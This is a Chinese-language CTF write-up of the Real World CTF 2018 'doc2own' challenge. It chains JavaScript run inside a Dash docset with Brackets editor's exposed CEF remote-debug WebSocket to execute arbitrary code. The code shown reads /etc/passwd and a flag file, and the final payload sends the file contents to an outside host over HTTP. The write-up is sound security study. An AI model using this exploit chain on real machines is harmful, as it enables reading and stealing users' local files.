---
layout: post
title: Real World CTF 2018 - doc2own
category: writeup
tags: [pwn]
---

![](https://i.imgur.com/C87T2gb.png)


上週末的 [Real World CTF](https://realworldctf.com/) 是一場蠻特別的 CTF，由 [長亭科技](https://www.chaitin.cn/) 所舉辦

比賽時間恰巧與 HITCON Community 還有 CODE BLUE CTF 重疊，實在沒什麼體力跟時間解題
但由於決賽冠軍獎金高達 100,000 USDT，相當於三百萬台幣，我們的身體還是很老實的參加了。

<!--more-->


這場 CTF 特殊之處在於這場比賽的精神在於「要玩就玩真的」， 比賽中的所有題目都是基於現實世界所在使用的軟體，例如 [CS:GO](https://store.steampowered.com/app/730/CounterStrike_Global_Offensive/)...

> 有一道 Crypto 題目甚至只有一個「美國政府的簽證申請網站」的連結...
> 但後來基於各種安全考量主辦方還是決定拿掉這道題目
> ( 畢竟大家下週還是想去參加 DEFCON / BlackHat 的... )
> 
> 賽後得知是要在網站上做 Padding Oracle... 美國人嚇都嚇死了

最後在結束前靠著其中的一道題目 `doc2own` 妥妥的進入決賽，決定寫篇 write-up 記錄一下解題的過程 :P

---

### 0x00. Challenge

> **doc2own** ( Points: 425, Solved by 4 Teams )
> 
> I have to fix these issues during the flight. Since that airline does not provide Internet, I have to download some documents for offline use.
> 
> http://34.236.229.208:8080
> 
> Hint : It's a pwnable game. You really need to achieve RCE to get the flag.
 

總之故事就是有個準備要出差的苦命工程師得在搭飛機時修正程式問題，
想要先下載一些說明文件來在飛機上離線使用

題目還提供了工程師的螢幕截圖，使用的是 macOS 上的 [Dash](https://kapeli.com/dash):
<p><a class="zoom" target="_blank" href="https://i.imgur.com/fV5etoq.png">
<img src="https://i.imgur.com/fV5etoq.png" width="512" height="384">
</a></p>

而我們可以透過題目提供的界面寄送 Dash 使用的文件格式 ( docset ) 給他:

<img src="https://i.imgur.com/jzlJ5X2.png" border="1">

---

### 0x01. XSS in Dash

照著 Dash 的 [官方文件](https://kapeli.com/docsets#dashDocset) 能夠做出一個自定內容的 docset

而 Dash 的文件主要由 HTML 組成，因此我先嘗試在 Dash 中執行任意的 JavaScript:
![](https://i.imgur.com/lcmmqLE.png)

測試了一陣子後發現能做的相當有限，由於 Dash 是透過 `WKWebView` ( 之類的東西 ) 來處理文件，
受到 sandbox 限制，就算網頁是在 local 載入也沒辦法透過 `iframe` 來載入程式目錄以外的檔案

Dash 的本體則是原生程式，與基於 Electron 之類的 Framework 所開發的桌面程式不同，無法直接透過 nodejs 來做一些壞壞的事情，不過還是能夠送個 HTTP Request，確認我們的 js 在遠端有被觸發

---

### 0x02. Reverse Dash

另一件有趣的事情是我們可以透過右鍵選單開啟 Debug Console，
這使得我能夠快速的測試 js code，同時也發現了有個神奇的 `dash` object:

![](https://i.imgur.com/cbcP8DV.png)

透過逆向 Dash.app 發現可以透過 js 中的 `dash` object 來呼叫程式中一些神奇的 Objective-C 函數，
例如 `dash.openDownloads()` 可以開啟下載視窗等等

程式中還有一些 Custom Protocol，一樣可以透過 js 來觸發原生函數:

<img src="https://i.imgur.com/Qjl3ZWA.png" height="450">

可惜的是嘗試了許久，還是沒辦法做到什麼壞壞的事情 : (

---

### 0x03. Brackets Editor

仔細看題目提供的螢幕截圖的話，會發現除了 Dash 以外，背後還執行了另一個程式: [Brackets Editor](http://brackets.io/)

![](https://i.imgur.com/yW1sZC0.png)

Brackets 也是透過 js / html / css 開發的潮潮編輯器，但不是基於 Electron
而是使用 [Chromium Embedded Framework](https://en.wikipedia.org/wiki/Chromium_Embedded_Framework)

假如我們能設法在 Brackets 上執行 js ，那這次就真的可以為所欲為了

---

### 0x04. CEF Remote Debug

在花了大量時間研究 Dash 及 Brackets 之後，發現 Brackets 在 local listen 了 8123 及 9234 Port:

![](https://i.imgur.com/i4oV1or.png)

想到 RPC Server，就直覺 Google 了 `Brackets DNS Rebinding` 
果不其然出過問題: [CEF remote debugging is vulnerable to dns rebinding attack #14149](https://github.com/adobe/brackets/issues/14149)

9234 Port 上的是 `CEF Remote Debug Port`
在本機透過瀏覽器連上的話就是個 Chrome 的 Dev-Tools:
![](https://i.imgur.com/wjyUCgj.png)

除了網頁界面以外，也能夠透過 WebSocket 來對 `CEF` 下達指令

---

透過存取 `http://localhost:9234/json` 可以得到 websocket 的 url:
```
$ curl http://localhost:9234/json
[ {
   "description": "",
   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9234/devtools/page/81E85B65-571F-4B91-8A79-9690B60154B5",
   "id": "81E85B65-571F-4B91-8A79-9690B60154B5",
   "title": "Getting Started — Brackets",
   "type": "page",
   "url": "file:///Applications/Brackets.app/Contents/www/index.html",
   "webSocketDebuggerUrl": "ws://localhost:9234/devtools/page/81E85B65-571F-4B91-8A79-9690B60154B5"
} ]
```

再透過 WebSocket 就能與 CEF 直接溝通並在 Brackets 中執行任意 js
Brackets 不受限於 sandbox，可以使用 `brackets.fs` 直接讀取任意目錄及檔案:

```javascript=
var ws = new WebSocket("ws://localhost:9234/devtools/page/81E85B65-571F-4B91-8A79-9690B60154B5");
ws.onopen = function() { 
    msg = {
        id: 1,
        method: "Runtime.evaluate",
        params: {
            expression: 'brackets.fs.readFile("/etc/passwd", "utf8",function(err, contents) {alert(contents);});'
        }
    }
    ws.send(JSON.stringify(msg));
};
```

![](https://i.imgur.com/bnhCFxl.png)



---

### 0x05. Remote Code Execution

雖然最新版本中已經修正了 `DNS Rebinding Attack` 的問題，會檢查 Host Header 必須來自 `localhost`
但由於我們能夠在本機的 Dash 中執行任意 js ，因此可以直接繞過這個檢查

最後，透過 Dash 來對 `CEF` 下指令，執行任意 js 並讀取 flag，再透過 HTTP Request 送回結果:

```javascript
function get(url) {
    try {
        var x = new XMLHttpRequest();
        x.open("GET", url, false);
        x.send();
        return x.responseText;
    } catch(e) {
        console.log(e);
        return "";
    }
}

var wsurl = JSON.parse(get("http://localhost:9234/json"))[0].webSocketDebuggerUrl;

var ws = new WebSocket(wsurl);
ws.onopen = function() { 
    msg = {
        id: 1,
        method: "Runtime.evaluate",
        params:{
            expression: 'brackets.fs.readFile("/flag.txt", "utf8", function(err, contents) {\
                             var g = new XMLHttpRequest();\
                             g.open("GET", "http://l4ys.tw/qq.php?"+encodeURIComponent(contents),true);\
                             g.send();\
                         });'
        }		
    };
    ws.send(JSON.stringify(msg));
};

ws.onmessage = function(e) {
    console.log(e.data);
    window.location = "http://l4ys.tw/?onmessage=" + JSON.stringify(e.data);
}
```

Flag: `Flag:rwctf{our_supply_chain_by_these_developers_guarded_please_dont_hurt}`

---
### 0xFF. Game Over

結合兩個程式的功能達成的 RCE ，兩者單獨存在時並不是什麼大問題，但放在一起就變成嚴重的系統漏洞


誰會想到編輯器預設竟然會開著一個 Debug Port 呢 🤔

隨著 JavaScript 開發的桌面程式越來越多，聽起來好像很安全，但實際上卻帶來了一個更大且更容易利用的攻擊面

---

順帶一提，解完題目後還不小心發現了 Dash 的一個 ~~0day~~ 功能
過幾天就是 DEFCON / BlackHat 了，實在是有點怕怕的

![](https://i.imgur.com/UkqLd8W.png)

